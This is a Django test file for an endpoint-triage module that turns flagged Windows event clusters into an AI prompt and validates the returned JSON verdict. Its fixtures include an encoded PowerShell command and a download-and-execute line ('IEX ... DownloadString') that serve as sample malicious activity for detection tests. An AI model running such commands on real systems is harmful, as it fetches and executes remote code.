"""Endpoint Triage context builder + agent module.

- build_endpoint_triage_context (apps/ai_core/services/endpoint_triage_context.py):
  lays out one flagged cluster as a prompt section, no AI.
- run_endpoint_triage (apps/ai_core/modules/endpoint_triage.py): the full
  gather -> prompt -> provider -> parse-verdict pipeline, proven with a
  fake provider. A response that is not a valid JSON verdict is a failed
  call (RuntimeError), never a guessed verdict.
"""

from __future__ import annotations

import json
from datetime import timedelta

from django.test import TestCase
from django.utils import timezone

from apps.ai_core.modules.endpoint_triage import run_endpoint_triage
from apps.ai_core.services.endpoint_triage_context import build_endpoint_triage_context
from apps.endpoints.models import Endpoint, EndpointCorrelationCandidate, EndpointEvent
from apps.organizations.models import Organization

NOW = timezone.now().replace(microsecond=0)


class _FakeProvider:
    model = "claude-sonnet-5-fake"

    def __init__(self, response_text):
        self.response_text = response_text
        self.last_prompt = None
        self.last_kwargs = None

    def send_message(self, prompt, **kwargs):
        self.last_prompt = prompt
        self.last_kwargs = kwargs
        if isinstance(self.response_text, Exception):
            raise self.response_text
        return self.response_text


def _build_candidate(*, trigger="suspicious_process_command_line: -enc", n_proc=2, n_sb=1):
    org = Organization.objects.create(
        name="Pilot Org",
        organization_type="Demo",
        country="St. Vincent and the Grenadines",
        sector="Demo",
        risk_profile="medium",
    )
    endpoint, _ = Endpoint.issue(organization=org, display_name="WIN-PILOT-01")
    endpoint.last_seen = NOW
    endpoint.save(update_fields=["last_seen"])

    candidate = EndpointCorrelationCandidate.objects.create(
        endpoint=endpoint,
        organization=org,
        first_event_at=NOW - timedelta(minutes=5),
        last_event_at=NOW,
        event_count=n_proc + n_sb,
        trigger_summary=trigger,
        status=EndpointCorrelationCandidate.Status.PENDING,
    )
    rid = 0
    for i in range(n_proc):
        rid += 1
        EndpointEvent.objects.create(
            endpoint=endpoint,
            organization=org,
            event_type="Security/4688",
            occurred_at=NOW - timedelta(minutes=5) + timedelta(minutes=i),
            candidate=candidate,
            payload={
                "computer": "WIN-PILOT-01",
                "record_id": rid,
                "data": {
                    "new_process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "parent_process_name": r"C:\Windows\explorer.exe",
                    "command_line": "powershell -enc SQBFAFgA",
                    "subject_user_name": "j.reyes",
                },
            },
        )
    for i in range(n_sb):
        rid += 1
        EndpointEvent.objects.create(
            endpoint=endpoint,
            organization=org,
            event_type="Microsoft-Windows-PowerShell/4104",
            occurred_at=NOW - timedelta(minutes=2) + timedelta(minutes=i),
            candidate=candidate,
            payload={
                "computer": "WIN-PILOT-01",
                "record_id": rid,
                "data": {"script_block_text": "IEX (New-Object Net.WebClient).DownloadString('http://x')", "path": ""},
            },
        )
    return candidate


class ContextBuilderTests(TestCase):
    def test_context_has_all_sections_and_real_detail(self):
        candidate = _build_candidate()
        context = build_endpoint_triage_context(candidate)

        self.assertIn("## Endpoint", context)
        self.assertIn("WIN-PILOT-01", context)
        self.assertIn("## Why This Was Flagged", context)
        self.assertIn("suspicious_process_command_line", context)
        self.assertIn("## Process-Creation Events (4688)", context)
        self.assertIn("powershell -enc SQBFAFgA", context)
        self.assertIn("## PowerShell Script Blocks (4104)", context)
        self.assertIn("DownloadString", context)
        self.assertIn("## Baseline", context)

    def test_empty_sections_are_labelled_not_omitted(self):
        candidate = _build_candidate(n_proc=1, n_sb=0)
        context = build_endpoint_triage_context(candidate)
        self.assertIn("## PowerShell Script Blocks (4104)\nNone in this cluster.", context)

    def test_long_script_block_is_truncated(self):
        candidate = _build_candidate(n_proc=0, n_sb=1)
        event = candidate.events.filter(event_type="Microsoft-Windows-PowerShell/4104").first()
        event.payload["data"]["script_block_text"] = "A" * 9000
        event.save(update_fields=["payload"])
        context = build_endpoint_triage_context(candidate)
        self.assertIn("truncated, 9000 chars total", context)

    def test_baseline_counts_prior_window(self):
        candidate = _build_candidate()
        # 3 events in the 5 minutes before the window
        for i in range(3):
            EndpointEvent.objects.create(
                endpoint=candidate.endpoint,
                organization=candidate.organization,
                event_type="Security/4688",
                occurred_at=candidate.first_event_at - timedelta(minutes=1 + i),
                payload={"data": {}},
            )
        context = build_endpoint_triage_context(candidate)
        self.assertIn("this endpoint produced 3 event(s)", context)


VALID_JSON = json.dumps(
    {
        "verdict": "escalate",
        "severity": "high",
        "summary": "Encoded PowerShell downloading a remote script.",
        "reasoning": "The 4688 command line uses -enc and the script block calls DownloadString.",
    }
)


class RunEndpointTriageTests(TestCase):
    def test_parses_a_valid_escalate_verdict(self):
        candidate = _build_candidate()
        provider = _FakeProvider(VALID_JSON)
        result = run_endpoint_triage(candidate, provider=provider)

        self.assertEqual(result["verdict"], "escalate")
        self.assertEqual(result["severity"], "high")
        self.assertEqual(result["model"], "claude-sonnet-5-fake")
        self.assertIn("Encoded PowerShell", result["summary"])
        # context, not just the preamble, reached the provider
        self.assertIn("## Why This Was Flagged", provider.last_prompt)
        self.assertEqual(provider.last_kwargs.get("organization"), candidate.organization)

    def test_benign_verdict_without_severity_defaults_low(self):
        candidate = _build_candidate()
        provider = _FakeProvider(json.dumps({"verdict": "benign", "summary": "s", "reasoning": "r"}))
        result = run_endpoint_triage(candidate, provider=provider)
        self.assertEqual(result["verdict"], "benign")
        self.assertEqual(result["severity"], "low")

    def test_json_in_a_code_fence_is_parsed(self):
        candidate = _build_candidate()
        provider = _FakeProvider(f"```json\n{VALID_JSON}\n```")
        result = run_endpoint_triage(candidate, provider=provider)
        self.assertEqual(result["verdict"], "escalate")

    def test_json_with_surrounding_prose_is_parsed(self):
        candidate = _build_candidate()
        provider = _FakeProvider(f"Here is my assessment:\n{VALID_JSON}\nLet me know if you need more.")
        result = run_endpoint_triage(candidate, provider=provider)
        self.assertEqual(result["verdict"], "escalate")

    def test_unparseable_response_raises_runtime_error(self):
        candidate = _build_candidate()
        provider = _FakeProvider("I think this looks suspicious but I'm not sure.")
        with self.assertRaises(RuntimeError):
            run_endpoint_triage(candidate, provider=provider)

    def test_invalid_verdict_value_raises_runtime_error(self):
        candidate = _build_candidate()
        provider = _FakeProvider(json.dumps({"verdict": "maybe", "severity": "high", "summary": "s", "reasoning": "r"}))
        with self.assertRaises(RuntimeError):
            run_endpoint_triage(candidate, provider=provider)

    def test_escalate_with_bad_severity_raises_runtime_error(self):
        candidate = _build_candidate()
        provider = _FakeProvider(json.dumps({"verdict": "escalate", "severity": "spicy", "summary": "s", "reasoning": "r"}))
        with self.assertRaises(RuntimeError):
            run_endpoint_triage(candidate, provider=provider)

    def test_missing_summary_raises_runtime_error(self):
        candidate = _build_candidate()
        provider = _FakeProvider(json.dumps({"verdict": "benign", "severity": "low", "reasoning": "r"}))
        with self.assertRaises(RuntimeError):
            run_endpoint_triage(candidate, provider=provider)

    def test_provider_runtime_error_propagates(self):
        candidate = _build_candidate()
        provider = _FakeProvider(RuntimeError("Anthropic API request failed: timed out"))
        with self.assertRaises(RuntimeError):
            run_endpoint_triage(candidate, provider=provider)
